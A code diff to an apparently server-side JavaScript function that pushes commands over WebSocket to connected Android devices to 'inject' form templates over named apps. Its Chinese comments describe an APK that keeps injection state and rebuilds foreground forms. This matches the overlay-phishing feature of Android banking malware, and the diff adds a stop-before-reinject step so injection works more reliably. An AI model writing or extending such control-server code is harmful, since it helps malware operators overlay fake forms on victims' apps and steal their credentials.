@@ -1251,6 +1251,28 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
         // 先登记活跃任务再下发。这样 APK 即使毫秒级确认，控制台
         // 也不会在“发送成功”和“DB 写入”的空窗期显示错误状态。
         if (ws.readyState === 1) {
+          // 重装后 /data/local/tmp 可能仍保留 APK 的旧注入状态。如果只发 SHOW，
+          // APK 会回报“已启用”但不会重建前台表单。自动注入与手动重注保持一致：
+          // 先收敛旧页面，再下发新模板。
+          ws.send(JSON.stringify({
+            type: 'command',
+            sessionId: deviceId,
+            data: {
+              command: 'STOP_INJECTION',
+              params: {
+                packageName: pkg,
+                requestId,
+                source: 'auto-injection-preflight',
+              },
+            },
+          }));
+          void recordDeviceDebug('injection.auto.preflight_stop_sent', deviceId, {
+            packageName: pkg,
+            templateId: tpl.template_id,
+            requestId,
+          });
+          await new Promise(resolve => setTimeout(resolve, 250));
+
           try {
             const affectedRows = await persistActiveInjectionTask(
               db,
